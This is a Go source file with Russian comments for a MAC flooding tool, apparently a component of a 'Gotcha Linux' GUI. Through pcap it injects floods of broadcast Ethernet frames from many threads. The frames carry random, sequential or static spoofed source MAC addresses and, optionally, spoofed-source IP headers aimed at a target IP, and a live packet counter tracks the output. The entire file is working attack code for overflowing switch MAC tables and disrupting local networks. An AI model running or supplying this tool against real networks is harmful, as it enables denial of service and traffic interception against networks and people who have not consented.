// cmd/MACflood/main.go
// MACflood — Go-версия флуда (замена 2macflood.cpp) СО СЧЁТЧИКОМ ПАКЕТОВ.
//
// Запуск (те же аргументы, что передаёт GUI Gotcha Linux):
//
//	MACflood <interface> <packets> <threads> <mac_mode> [target_ip]
//
// Счётчик выводится в консоль раз в секунду и в конце:
//
//	[Stats] total=184322, speed=184322 pkt/s
//	[Stats] flood finished, total=400000 packets
//
// Сборка: go build -o bin/MACflood ./cmd/MACflood
package main

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"strconv"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/google/gopacket/pcap"
)

const (
	ethHeaderLen    = 14
	framePayloadLen = 1500
)

var (
	runningFlag  int32 = 1 // 1, пока не пришёл SIGINT/SIGTERM
	totalPackets int64     // АТОМАРНЫЙ СЧЁТЧИК: пакеты всех потоков
)

func isRunning() bool { return atomic.LoadInt32(&runningFlag) == 1 }

// buildIPHeader — явный IP-заголовок (big-endian), как в C++-версии.
func buildIPHeader(ipBuf []byte, srcIP, dstIP uint32, totalLen uint16) {
	for i := 0; i < 20; i++ {
		ipBuf[i] = 0
	}
	ipBuf[0] = 0x45 // Version=4, IHL=5
	ipBuf[1] = 0    // TOS
	binary.BigEndian.PutUint16(ipBuf[2:4], totalLen)
	binary.BigEndian.PutUint16(ipBuf[4:6], uint16(rand.Intn(65535))) // ID
	ipBuf[6] = 0                                                     // Flags + Fragment
	ipBuf[7] = 0
	ipBuf[8] = 64 // TTL
	ipBuf[9] = 17 // Protocol: UDP
	ipBuf[10] = 0 // Checksum = 0
	ipBuf[11] = 0
	binary.BigEndian.PutUint32(ipBuf[12:16], srcIP)
	binary.BigEndian.PutUint32(ipBuf[16:20], dstIP)
}

func generateRandomMAC(mac []byte, rnd *rand.Rand) {
	for i := range mac {
		mac[i] = byte(rnd.Intn(256))
	}
	mac[0] |= 0x02 // locally administered
	mac[0] &= 0xFE // не multicast
}

func parseMAC(s string) (net.HardwareAddr, bool) {
	switch s {
	case "random", "flood", "sequential":
		return nil, false
	}
	hw, err := net.ParseMAC(s)
	if err != nil || len(hw) != 6 {
		return nil, false
	}
	return hw, true
}

// ===== СЧЁТЧИК: раз в секунду печатает всего пакетов и скорость =====
func statsPrinter(stop chan struct{}, wg *sync.WaitGroup) {
	defer wg.Done()
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()
	var last int64
	for {
		select {
		case <-stop:
			return
		case <-ticker.C:
			cur := atomic.LoadInt64(&totalPackets)
			fmt.Printf("[Stats] total=%d, speed=%d pkt/s\n", cur, cur-last)
			last = cur
		}
	}
}

func floodThread(threadID int, iface string, packetCount int, mode string,
	staticMAC net.HardwareAddr, targetIP uint32, hasTarget bool, wg *sync.WaitGroup) {
	defer wg.Done()

	handle, err := pcap.OpenLive(iface, 65536, false, pcap.BlockForever)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[Thread %d] Error creating socket: %v\n", threadID, err)
		return
	}
	defer handle.Close()

	rnd := rand.New(rand.NewSource(time.Now().UnixNano() ^ int64(threadID)*12345))

	frame := make([]byte, ethHeaderLen+framePayloadLen)
	for i := 0; i < 6; i++ {
		frame[i] = 0xFF // dst MAC = broadcast
	}
	frame[12] = 0x08 // EtherType IPv4
	frame[13] = 0x00

	payload := frame[ethHeaderLen:]
	for i := range payload {
		payload[i] = 0xAA
	}

	seqMAC := make([]byte, 6)
	generateRandomMAC(seqMAC, rnd)

	fmt.Printf("[Thread %d] Started flooding on %s\n", threadID, iface)

	sent := 0
	for isRunning() && (packetCount == 0 || sent < packetCount) {
		switch mode {
		case "sequential":
			for i := 5; i >= 0; i-- {
				seqMAC[i]++
				if seqMAC[i] != 0 {
					break
				}
			}
			seqMAC[0] |= 0x02
			seqMAC[0] &= 0xFE
			copy(frame[6:12], seqMAC)
		case "random", "flood":
			var m [6]byte
			generateRandomMAC(m[:], rnd)
			copy(frame[6:12], m[:])
		default: // static
			copy(frame[6:12], staticMAC)
		}

		if hasTarget {
			buildIPHeader(payload, rnd.Uint32(), targetIP, framePayloadLen)
		}

		_ = handle.WritePacketData(frame)

		sent++
		atomic.AddInt64(&totalPackets, 1) // <<< СЧЁТЧИК ПАКЕТОВ
		if packetCount > 100000 {
			time.Sleep(100 * time.Microsecond)
		}
	}
	// эта строка нужна GUI для статистики — оставляем как есть
	fmt.Printf("[Thread %d] Sent %d packets.\n", threadID, sent)
}

func printUsage(prog string) {
	fmt.Printf("Usage: %s <interface> <packets> <threads> <mac_mode> [target_ip]\n", prog)
	fmt.Println("  packets: Number of packets per thread (0 for infinite)")
	fmt.Println("  threads: Number of parallel threads")
	fmt.Println("  mac_mode: 'random', 'flood', 'sequential' or static MAC (XX:XX...)")
	fmt.Println("  target_ip: (Optional) Destination IP for IP header")
}

func main() {
	if len(os.Args) < 5 {
		printUsage(os.Args[0])
		os.Exit(1)
	}
	iface := os.Args[1]
	packetCount, err := strconv.Atoi(os.Args[2])
	if err != nil || packetCount < 0 {
		fmt.Fprintln(os.Stderr, "Invalid packet count")
		os.Exit(1)
	}
	threadCount, err := strconv.Atoi(os.Args[3])
	if err != nil || threadCount <= 0 || threadCount > 100 {
		fmt.Fprintln(os.Stderr, "Invalid thread count (1-100)")
		os.Exit(1)
	}
	macArg := os.Args[4]

	var targetIP uint32
	hasTarget := false
	if len(os.Args) >= 6 {
		if v4 := net.ParseIP(os.Args[5]); v4 != nil {
			if v4 = v4.To4(); v4 != nil {
				targetIP = binary.BigEndian.Uint32(v4)
				hasTarget = true
				fmt.Printf("Target IP set to: %s\n", os.Args[5])
			}
		}
	}

	mode := ""
	var staticMAC net.HardwareAddr
	switch macArg {
	case "random", "flood", "sequential":
		mode = macArg
		fmt.Println("Mode: Random MAC Generation")
	default:
		hw, ok := parseMAC(macArg)
		if !ok {
			fmt.Fprintf(os.Stderr, "Invalid MAC address: %s\n", macArg)
			os.Exit(1)
		}
		staticMAC = hw
		mode = "static"
		fmt.Printf("Mode: Static MAC %s\n", macArg)
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		atomic.StoreInt32(&runningFlag, 0)
	}()

	fmt.Printf("Starting MAC Flood on %s with %d threads...\n", iface, threadCount)

	// запуск счётчика
	stopStats := make(chan struct{})
	var statsWg sync.WaitGroup
	statsWg.Add(1)
	go statsPrinter(stopStats, &statsWg)

	var wg sync.WaitGroup
	for i := 0; i < threadCount; i++ {
		wg.Add(1)
		go floodThread(i, iface, packetCount, mode, staticMAC, targetIP, hasTarget, &wg)
	}
	wg.Wait()

	close(stopStats)
	statsWg.Wait()
	fmt.Printf("[Stats] flood finished, total=%d packets\n", atomic.LoadInt64(&totalPackets))
	fmt.Println("Flood finished.")
}
